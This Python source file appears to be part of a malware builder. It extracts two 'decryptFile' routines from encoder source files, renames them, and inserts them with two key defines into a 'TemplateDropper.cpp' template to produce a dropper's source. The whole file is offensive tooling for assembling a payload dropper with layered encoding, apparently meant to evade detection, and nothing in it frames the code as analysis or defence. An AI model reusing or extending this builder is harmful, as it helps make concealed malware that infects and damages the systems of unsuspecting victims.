import re
def extract_decrypt_function(file_path, new_name=None):
    """Extracts the decryptFile function and optionally renames it."""
    with open(file_path, 'r', encoding='utf-8') as f:
        code = f.read()

    pattern = r'void\s+decryptFile\s*\([^)]*\)\s*\{(?:[^{}]|\{[^{}]*\})*\}'
    match = re.search(pattern, code, re.DOTALL)

    if not match:
        return None

    func_code = match.group(0).strip()

    if new_name:
        func_code = re.sub(r'\bdecryptFile\b', new_name, func_code)

    return func_code
def create_dropper(outpath, encoder1, encoder2, key1, key2):
    template_path = "TemplateDropper.cpp"
    output_path = outpath

    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    dec1 = extract_decrypt_function(encoder1, "decrypt1")
    dec2 = extract_decrypt_function(encoder2, "decrypt2")
    content = content.replace("//define key1", f"#define KEY1 {key1}")
    content = content.replace("//define key2", f"#define KEY2 {key2}")

    content = content.replace("//decodescript1", dec1)
    content = content.replace("//decodescript2", dec2)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)